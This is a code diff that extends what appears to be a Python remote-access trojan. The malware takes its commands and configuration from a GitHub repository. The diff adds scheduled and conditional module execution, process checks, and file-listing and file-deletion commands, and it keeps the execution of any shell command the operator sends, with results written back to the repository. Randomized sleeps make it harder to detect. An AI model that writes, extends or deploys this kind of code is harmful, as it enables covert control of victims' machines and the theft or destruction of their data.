@@ -6,8 +6,8 @@ import random
 import sys
 import threading
 import time
-import subprocess  # Import subprocess module
-from datetime import datetime
+import subprocess
+from datetime import datetime, timedelta
 
 def github_connect():
     with open('secret.txt') as f:
@@ -35,9 +35,51 @@ class Trojan:
                 exec("import %s" % task['module'])
         return config
 
-    def module_runner(self, module):
-        result = sys.modules[module].run()
-        self.store_module_result(result)
+    def check_condition(self, condition, args):
+        if condition == "file_exists":
+            return os.path.exists(args)
+        elif condition == "process_running":
+            output = subprocess.getoutput(f"tasklist | findstr {args}")
+            return bool(output)
+        return False
+
+    def should_run(self, module_config):
+        run_at = module_config.get('run_at')
+        frequency = module_config.get('frequency')
+        condition = module_config.get('condition')
+        condition_args = module_config.get('condition_args')
+
+        now = datetime.now()
+        if run_at:
+            run_time = datetime.fromisoformat(run_at)
+            if now < run_time:
+                return False
+
+        if condition:
+            if not self.check_condition(condition, condition_args):
+                return False
+
+        return True
+
+    def schedule_next_run(self, module_config):
+        frequency = module_config.get('frequency')
+        run_at = module_config.get('run_at')
+        now = datetime.now()
+
+        if frequency == "daily":
+            next_run = datetime.fromisoformat(run_at) + timedelta(days=1)
+        elif frequency == "hourly":
+            next_run = datetime.fromisoformat(run_at) + timedelta(hours=1)
+        else:
+            return  # For "once", we don't reschedule
+
+        module_config['run_at'] = next_run.isoformat()
+
+    def module_runner(self, module, config):
+        if self.should_run(config):
+            result = sys.modules[module].run()
+            self.store_module_result(result)
+            self.schedule_next_run(config)
 
     def store_module_result(self, data):
         message = datetime.now().isoformat()
@@ -57,28 +99,43 @@ class Trojan:
         elif command.lower() == 'start':
             self.running = True
             self.update_status('Running')
+        elif command.startswith('list_files'):
+            directory = command.split(' ', 1)[1]
+            result = subprocess.getoutput(f'dir {directory}')
+            self.update_status(result)
+        elif command.startswith('delete_file'):
+            filename = command.split(' ', 1)[1]
+            result = subprocess.getoutput(f'del {filename}')
+            self.update_status(result)
         else:
-            result = subprocess.getoutput(command)  # Using subprocess to execute the command
+            result = subprocess.getoutput(command)
             self.update_status(f"Command '{command}' executed with result: {result}")
 
     def update_status(self, status):
         status_file_path = f'status/{self.id}.status'
-        
-        # Check if the status file already exists
+
         try:
             contents = self.repo.file_contents(status_file_path)
-            # If the file exists, update it
             contents.update(status, status.encode('utf-8'))
         except github3.exceptions.NotFoundError:
-            # If the file doesn't exist, create it
             self.repo.create_file(status_file_path, status, status.encode('utf-8'))
 
     def run(self):
         while self.running:
+            config = self.get_config()
+
+            # Execute modules based on config
+            for task in config.get('modules', []):
+                thread = threading.Thread(target=self.module_runner, args=(task['module'], task))
+                thread.start()
+                time.sleep(random.randint(1, 10))
+
+            # Execute commands
             commands = self.fetch_commands()
             for command in commands:
                 self.execute_command(command)
                 time.sleep(random.randint(1, 10))
+
             time.sleep(random.randint(30*60, 3*60*60))
 
 class GitImporter:
